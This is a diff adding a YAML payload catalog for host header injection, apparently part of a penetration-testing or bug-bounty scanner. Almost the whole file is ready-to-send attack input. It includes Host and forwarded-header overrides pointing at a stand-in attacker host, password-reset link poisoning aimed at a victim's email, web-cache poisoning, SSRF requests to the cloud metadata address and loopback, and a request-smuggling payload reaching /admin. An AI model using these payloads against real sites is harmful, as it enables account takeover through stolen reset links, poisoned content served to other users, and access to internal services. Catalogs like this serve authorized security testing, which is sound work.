@@ -1,0 +1,244 @@
+id: host_header_injection
+name: Host Header Injection
+version: 1.0.0
+category: injection
+description: |
+  Host-header attacks that influence backend routing, password-reset link
+  generation, web-cache poisoning, and SSRF. Includes classic Host overrides,
+  X-Forwarded-Host abuse, ambiguous absolute-URI requests, and dual-header
+  splits.
+mitre:
+  - T1190
+  - T1556
+owasp_top10:
+  - A05:2021
+references:
+  - https://portswigger.net/web-security/host-header
+  - https://book.hacktricks.xyz/pentesting-web/abusing-hop-by-hop-headers
+  - https://owasp.org/www-community/attacks/Cache_Poisoning
+related_tools:
+  - nuclei
+  - paramspider
+chains:
+  - bug_bounty_full
+  - web_active
+payloads:
+  - id: classic_override
+    name: Plain Host override
+    subcategory: simple_override
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      Host: attacker.example.net
+    notes: Reset emails / abs URLs sometimes use this verbatim
+    source: https://portswigger.net/web-security/host-header
+  - id: x_forwarded_host
+    name: X-Forwarded-Host injection
+    subcategory: forwarded_header
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      Host: target.example.net
+      X-Forwarded-Host: attacker.example.net
+    notes: null
+    source: https://portswigger.net/web-security/host-header
+  - id: x_host
+    name: X-Host injection
+    subcategory: forwarded_header
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      X-Host: attacker.example.net
+    notes: null
+    source: common knowledge
+  - id: forwarded_header
+    name: RFC 7239 Forwarded header
+    subcategory: forwarded_header
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: |
+      Forwarded: host=attacker.example.net
+    notes: null
+    source: https://datatracker.ietf.org/doc/html/rfc7239
+  - id: x_forwarded_server
+    name: X-Forwarded-Server injection
+    subcategory: forwarded_header
+    encoding: raw
+    tech_targets: [apache, generic]
+    severity_when_works: medium
+    payload: |
+      X-Forwarded-Server: attacker.example.net
+    notes: null
+    source: common knowledge
+  - id: x_http_host_override
+    name: X-HTTP-Host-Override
+    subcategory: forwarded_header
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: |
+      X-HTTP-Host-Override: attacker.example.net
+    notes: null
+    source: common knowledge
+  - id: dual_host
+    name: Duplicate Host headers
+    subcategory: ambiguous
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      Host: target.example.net
+      Host: attacker.example.net
+    notes: Different proxies prefer different copies
+    source: https://portswigger.net/web-security/host-header
+  - id: absolute_uri
+    name: Absolute URI request line
+    subcategory: ambiguous
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      GET https://attacker.example.net/path HTTP/1.1
+      Host: target.example.net
+    notes: Some servers route by URI, others by Host
+    source: https://portswigger.net/web-security/host-header
+  - id: indented_host
+    name: Indented (line-folded) Host
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: |
+      Host: target.example.net
+       Host: attacker.example.net
+    notes: Some parsers join folded lines
+    source: common knowledge
+  - id: host_port_injection
+    name: Host with port injection
+    subcategory: simple_override
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: |
+      Host: target.example.net:@attacker.example.net
+    notes: For URL parsers that treat @ as userinfo
+    source: https://portswigger.net/web-security/host-header
+  - id: ssrf_internal
+    name: SSRF via Host to internal
+    subcategory: ssrf
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      Host: 169.254.169.254
+    notes: Pivot to cloud metadata when backend resolves Host
+    source: common knowledge
+  - id: cache_poison_x_forwarded_host
+    name: Cache poison via X-Forwarded-Host
+    subcategory: cache_poison
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: critical
+    payload: |
+      GET / HTTP/1.1
+      Host: target.example.net
+      X-Forwarded-Host: attacker.example.net
+      Cookie: cachebuster=1234
+
+    notes: When app reflects X-Forwarded-Host in HTML and CDN caches by URL only
+    source: https://portswigger.net/research/practical-web-cache-poisoning
+  - id: password_reset_poison
+    name: Password reset link poison
+    subcategory: reset_link
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: critical
+    payload: |
+      POST /forgot-password HTTP/1.1
+      Host: attacker.example.net
+
+      email=victim@target.example.net
+    notes: Generated reset URL points at attacker
+    source: https://skeletonscribe.net/2013/05/practical-http-host-header-attacks.html
+  - id: smtp_alt_host
+    name: SMTP X-Forwarded-Host for reset
+    subcategory: reset_link
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      Host: target.example.net
+      X-Forwarded-Host: attacker.example.net
+    notes: null
+    source: https://skeletonscribe.net/2013/05/practical-http-host-header-attacks.html
+  - id: cl_smuggling_via_host
+    name: CL.0 host-based smuggling
+    subcategory: smuggle
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      GET / HTTP/1.1
+      Host: target.example.net
+      Connection: close
+      Content-Length: 41
+
+      GET /admin HTTP/1.1
+      Host: target.example.net
+
+    notes: null
+    source: common knowledge
+  - id: virtual_host_routing
+    name: Internal vhost discovery
+    subcategory: vhost_disc
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: |
+      Host: admin.target.internal
+    notes: Iterate via wordlist
+    source: common knowledge
+  - id: utf8_host
+    name: UTF-8 punycode Host
+    subcategory: filter_bypass
+    encoding: unicode
+    tech_targets: [generic]
+    severity_when_works: low
+    payload: |
+      Host: xn--trget-cqa.example.net
+    notes: Visually similar
+    source: common knowledge
+  - id: backslash_host
+    name: Backslash separator
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: |
+      Host: target.example.net\attacker.example.net
+    notes: null
+    source: common knowledge
+  - id: ip_loopback
+    name: 127.0.0.1 Host with port
+    subcategory: ssrf
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      Host: 127.0.0.1:8080
+    notes: null
+    source: common knowledge
+  - id: spoof_via_cdn
+    name: CDN bypass with X-Original-Host
+    subcategory: forwarded_header
+    encoding: raw
+    tech_targets: [cdn]
+    severity_when_works: high
+    payload: |
+      X-Original-Host: attacker.example.net
+    notes: null
+    source: common knowledge
